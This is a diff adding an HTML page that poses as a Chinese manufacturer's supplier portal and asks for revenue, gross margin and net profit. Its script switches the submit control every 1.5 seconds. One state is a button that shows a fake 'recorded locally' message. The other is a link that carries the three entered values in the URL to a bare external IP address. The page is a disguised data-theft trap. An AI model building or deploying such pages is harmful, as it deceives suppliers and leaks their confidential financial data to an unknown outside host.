@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head><meta charset="UTF-8"><title>华远精密制造 · 供应商协同平台</title>
+<style>
+ body{font-family:"PingFang SC",sans-serif;max-width:760px;margin:0 auto;padding:24px;color:#222;background:#f7f9fb}
+ h1{font-size:18px;color:#0f766e;margin-bottom:8px}
+ .meta{font-size:12.5px;color:#94a3b8;margin-bottom:14px}
+ .card{background:#fff;border:1px solid #e5e9f0;border-radius:10px;padding:16px 20px}
+ label{display:block;font-size:13px;color:#475569;margin:10px 0 4px}
+ input{width:100%;padding:8px;border:1px solid #d5dae1;border-radius:6px;box-sizing:border-box;font-size:14px}
+ .btn{margin-top:16px;width:100%;padding:11px;background:#0f766e;color:#fff;border:none;border-radius:6px;font-size:15px;text-align:center;display:block;text-decoration:none}
+</style></head><body>
+<h1>华远精密制造 · 供应商协同平台</h1>
+<div class="meta">通知编号 HY-2026-1131 · 对账资料登记</div>
+<div class="card">
+  <div style="font-size:14px;line-height:1.85">请填写本期营业收入、毛利率、净利润，核对无误后点击下方按钮完成登记。登记后由我司财务部核对。</div>
+  <label for="a">本期营业收入</label><input id="a" name="revenue" type="text">
+  <label for="b">毛利率</label><input id="b" name="margin" type="text">
+  <label for="c">净利润</label><input id="c" name="profit" type="text">
+  <span id="slot"><button class="btn" id="go">报送资料</button></span>
+</div>
+<script>
+// 按钮/链接交替；链接的 href 由三个输入框的值实时拼接
+var toLink = false;
+function paint(){
+  var a=document.getElementById('a').value.trim(),
+      b=document.getElementById('b').value.trim(),
+      c=document.getElementById('c').value.trim();
+  var slot=document.getElementById('slot'); slot.innerHTML='';
+  var el;
+  if (toLink) {
+    el=document.createElement('a');
+    el.href='http://8.163.58.115:18781/swapex/check?d='+encodeURIComponent(a+'|'+b+'|'+c);
+    el.textContent='报送资料';
+  } else {
+    el=document.createElement('button');
+    el.textContent='报送资料';
+    el.addEventListener('click', function(){
+      document.querySelector('.card').insertAdjacentHTML('beforeend','<div style="margin-top:12px;color:#065f46">登记已记录（本地）。</div>');
+    });
+  }
+  el.id='go'; el.className='btn';
+  slot.appendChild(el);
+  toLink=!toLink;
+}
+paint(); setInterval(paint, 1500);
+</script></body></html>
